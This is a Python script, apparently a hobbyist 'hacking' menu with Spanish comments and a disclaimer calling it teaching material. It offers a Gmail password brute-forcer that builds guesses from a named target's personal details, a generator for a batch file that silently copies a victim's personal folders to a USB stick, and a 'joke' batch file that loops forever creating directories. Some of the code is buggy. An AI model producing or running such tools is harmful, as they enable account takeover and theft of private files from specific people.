#-*- coding: utf-8 -*-
# no me hago responsable de lo que se haga con este programa, este software está hecho con fines didacticos.
import smtplib
import subprocess
import getpass
import os


#///////////////////////////////////////////////////////////////////////////
#  VARIABLES NECESARIAS:
CONTENT1 ='''@echo off
copy C:\Users\%USERNAME%\Pictures\*.* .\sofia\ 
copy C:\Users\%USERNAME%\Destkop\*.* .\sofia\ 
copy C:\Users\%USERNAME%\Downloads\*.* .\sofia\

copy C:\Users\%USERNAME%\Documents\*.*.\sofia\ 
copy C:\Users\%USERNAME%\Videos\*.*.\sofia\ 
copy C:\Users\%USERNAME%\Music\*.* .\sofia\ '''
CONTENT2 = '''@echo off
:loop
mkdir %random%
color 20
color 40
color E0
goto loop'''
MSG1 = '''
se va a crear un archivo.bat con un programa para copiar archivos 
desde una usb...
para que esto funcione debe de tener una usb con una carpeta llamada 'sofia'
la cual se encuentre en el mismo directorio que el archivo que esta a punto de 
crearse en la ruta {}'''.format(os.getcwd())
MSG2 = "de momento solo hay un virus joke porque es muy tarde"
#///////////////////////////////////////////////////////////////////////////

def config():
	conf = str()
	while conf != 'r':
		subprocess.call(["cmd.exe","/c","cls"])
		conf = str(raw_input('''
		/////////////////////////////
		Elige el color de las letras:
		-----------------------------
		[v]erde                      
		[b]lanco                     
		[a]marillo                   
		-----------------------------
		[r]egresar al menu principal
		/////////////////////////////
		> '''))
		if conf == "v":
			subprocess.call(["cmd.exe","/c","color a"])
		elif conf == "b":
			subprocess.call(["cmd.exe","/c","color 7"])
		elif conf == "a":
			subprocess.call(["cmd.exe","/c","color e"])




def filefactory(msg, content):
	subprocess.call(["cmd.exe","/c","cls"])
	print('''{}'''.format(msg))
	getpass.getpass("presione enter para continuar...")
	subprocess.call(["cmd.exe","/c","cls"])
	filename = str(raw_input("introduzca el nombre del archivo (no agregue el .bat): "))
	filename += ".bat"
	file = open(filename, "w")
	file.write('''{}'''.format(content))
	file.close()


def bforce():
	data = ["123456","12345678","qwerty", "Password", "password", "123456789"]
	subprocess.call(["cmd.exe","/c","cls"])
	print("este algoritmo solo funciona con correos de gmail.")
	email = str(raw_input("introduce el corre electronico de el objetivo: "))
	name = str(raw_input("introduce el nombre de el objetivo: "))
	data.append(name)
	year = str(raw_input("introduce el año de nacimeinto de {}: ".format(name)))
	data.append(year)
	cpl = str(raw_input("{} tiene pareja? Y/N: ".format(name)))
	if cpl == "y" or cpl == "Y":
		couple = str(raw_input("como se llama la pareja de {}?: ".format(name)))
		data.append(couple)
		anniversary = str(raw_input)
		data.append(anniversary)
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	for passw in data:
		for passw2 in data:
			rpass = passw + passw2
			try:
				server.login(email, rpass)
			except Exception as e:
				print("{} probablemente no es la clave de {}".format(rpass, email))
				print("")
			else:
				print("{} es la clave de {}".format(rpass, email))
				break
	getpass.getpass("presione enter para continuar...")

def run(content1, content2, msg1, msg2):
	do = str()
	while do != 'exit':
		subprocess.call(["cmd.exe","/c","cls"])
		do = str(raw_input('''
			*************************
			[f]uerza bruta
			[s]pyware
			[j]oke malware
			[c]onfiguracion
			-------------------------
			para salir escribe "exit"
			*************************
            
             > '''))
		do == do.lower()
		if do == "f":
			bforce()
		elif do == "s":
		   filefactory(msg1, content1)
		elif do == "j":
			filefactory(msg2, content2)
		elif do == "c":
			config()


if __name__ == '__main__':
	run(CONTENT1, CONTENT2, MSG1, MSG2)


	